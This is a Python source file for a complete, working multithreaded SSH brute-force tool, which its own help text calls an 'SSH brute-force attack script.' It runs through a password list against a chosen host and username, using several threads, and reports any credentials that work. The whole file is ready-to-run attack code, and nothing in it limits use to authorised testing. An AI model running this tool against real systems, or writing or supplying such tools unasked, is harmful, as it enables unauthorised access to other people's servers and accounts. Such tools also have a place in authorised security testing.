import paramiko
import argparse
from datetime import datetime
from termcolor import colored
from os import path
from threading import Lock, Thread, Event
from queue import Queue, Empty
from sys import exit

def get_args():
    parser = argparse.ArgumentParser(description="SSH brute-force attack script.")
    parser.add_argument("--host", required=True)
    parser.add_argument('-u', '--username', dest='username', required=True)
    parser.add_argument("--password-file", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument('-t', '--threads', dest='threads', default=4, type=int)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    if args.dry_run:
        print("Dry run mode enabled. Options set:")
        print(f"Host: {args.host}\nUsername: {args.username}\nPassword file: {args.password_file}\nPort: {args.port}")
        return None
    return args

def try_ssh(host, port, username, password, lock, found_event, result_holder):
    if found_event.is_set():
        return
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password, banner_timeout=10, timeout=10)
    except paramiko.AuthenticationException:
        with lock:
            print(f"[Attempt] target:- {host} - login:{username} - password:{password}")
    except Exception as e:
        with lock:
            print(f"[Error] {e} for password: {password}")
    else:
        with lock:
            print(colored(f"[{port}] [ssh] host:{host}  login:{username}  password:{password}", 'green'))
            result_holder['password'] = password
        found_event.set()
    finally:
        try:
            ssh.close()
        except Exception:
            pass

def worker(host, port, username, q, lock, found_event, result_holder):
    while not found_event.is_set():
        try:
            pwd = q.get(timeout=0.5)
        except Empty:
            # timeout -> check event again
            continue
        try:
            # if someone else found it since we got this password, just skip
            if found_event.is_set():
                pass
            else:
                try_ssh(host, port, username, pwd, lock, found_event, result_holder)
        finally:
            q.task_done()

def main(host, port, username, password_file, threads):
    q = Queue()
    lock = Lock()
    found_event = Event()
    result_holder = {}

    # load
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            pw = line.rstrip('\n')
            if pw:
                q.put(pw)

    # start workers
    workers = []
    for _ in range(threads):
        t = Thread(target=worker, args=(host, port, username, q, lock, found_event, result_holder))
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        # Wait until found_event or until the queue is fully processed
        while True:
            if found_event.is_set():
                # password found: drain the queue so q.join() can complete
                with lock:
                    print("[*] Password found — draining remaining queue items and stopping workers.")
                while True:
                    try:
                        q.get_nowait()
                        q.task_done()
                    except Empty:
                        break
                break

            # if no tasks remain (all got task_done) break
            if q.empty() and q.unfinished_tasks == 0:
                break

            # short wait so we don't busy-wait
            found_event.wait(timeout=0.2)
    except KeyboardInterrupt:
        found_event.set()
        print("\n[!] Interrupted by user — shutting down.")

    # ensure all workers exit
    for t in workers:
        t.join(timeout=1)

    if found_event.is_set():
        print(colored(f"\n[!] Password found: {result_holder.get('password')}\n", 'green'))
    else:
        print(colored("\n[-] Password not found in the list.\n", 'red'))

if __name__ == "__main__":
    args = get_args()
    if args is None:
        exit(0)
    if not path.exists(args.password_file):
        print(colored("[-] password_file doesn't exist", 'red'))
        exit(1)
    print(colored(f"\n\nSSH-Bruteforce starting on {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n", 'yellow'))
    main(args.host, args.port, args.username, args.password_file, args.threads)
